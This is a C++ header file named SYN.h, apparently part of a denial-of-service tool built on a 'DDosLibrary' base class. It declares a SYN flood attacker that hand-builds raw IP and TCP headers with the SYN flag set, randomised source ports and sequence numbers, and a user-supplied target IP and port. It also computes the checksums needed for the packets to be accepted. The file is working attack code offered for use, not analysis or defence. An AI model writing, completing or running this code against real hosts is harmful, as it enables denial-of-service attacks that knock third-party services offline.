//
// Created by mao on 17-12-20.
//

#ifndef DDOS_SYN_H
#define DDOS_SYN_H


#include <netinet/in.h>
#include <arpa/inet.h>
#include "DDosLibrary.h"

class SYN : public DDosLibrary {
public:
    explicit SYN(const arg_bundle &args);


    void run() override;

private:
    int sockfd;

    void syn(sockaddr_in *addr);

    struct ip {
        unsigned char hl;
        unsigned char tos;
        unsigned short total_len;
        unsigned short id;
        unsigned short frag_and_flags;
        unsigned char ttl;
        unsigned char proto;
        unsigned short checksum;
        unsigned int sourceIP;
        unsigned int destIP;
    };

    struct tcphdr {
        unsigned short sport;
        unsigned short dport;
        unsigned int seq;
        unsigned int ack;
        unsigned char lenres;
        unsigned char flag;
        unsigned short win;
        unsigned short sum;
        unsigned short urp;
    };

    struct pseudohdr {
        unsigned int saddr;
        unsigned int daddr;
        char zero;
        char protocol;
        unsigned short length;
    };

    unsigned short inline checksum(unsigned short *buffer, unsigned short size) {

        unsigned long cksum = 0;

        while (size > 1) {
            cksum += *buffer++;
            size -= sizeof(unsigned short);
        }

        if (size) {
            cksum += *(unsigned char *) buffer;
        }

        cksum = (cksum >> 16) + (cksum & 0xffff);
        cksum += (cksum >> 16);

        return ((unsigned short) (~cksum));
    }

    void init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader) {
        int len = sizeof(struct ip) + sizeof(struct tcphdr);
        // IP头部数据初始化
        ip->hl = (4 << 4 | sizeof(struct ip) / sizeof(unsigned int));
        ip->tos = 0;
        ip->total_len = htons(len);
        ip->id = 1;
        ip->frag_and_flags = 0x40;
        ip->ttl = 255;
        ip->proto = IPPROTO_TCP;
        ip->checksum = 0;
        ip->sourceIP = 0;
        ip->destIP = inet_addr(this->args.target_ip);

        // TCP头部数据初始化
        tcp->sport = htons(static_cast<uint16_t>(rand() % 16383 + 49152));
        tcp->dport = htons(this->args.target_port);
        tcp->seq = htonl(static_cast<uint32_t>(rand() % 90000000 + 2345));
        tcp->ack = 0;
        tcp->lenres = (sizeof(struct tcphdr) / 4 << 4 | 0);
        tcp->flag = 0x02;
        tcp->win = htons(2048);
        tcp->sum = 0;
        tcp->urp = 0;

        //TCP伪头部
        pseudoheader->zero = 0;
        pseudoheader->protocol = IPPROTO_TCP;
        pseudoheader->length = htons(sizeof(struct tcphdr));
        pseudoheader->daddr = inet_addr(this->args.target_ip);
        srand((unsigned) time(nullptr));

    }

};


#endif //DDOS_SYN_H
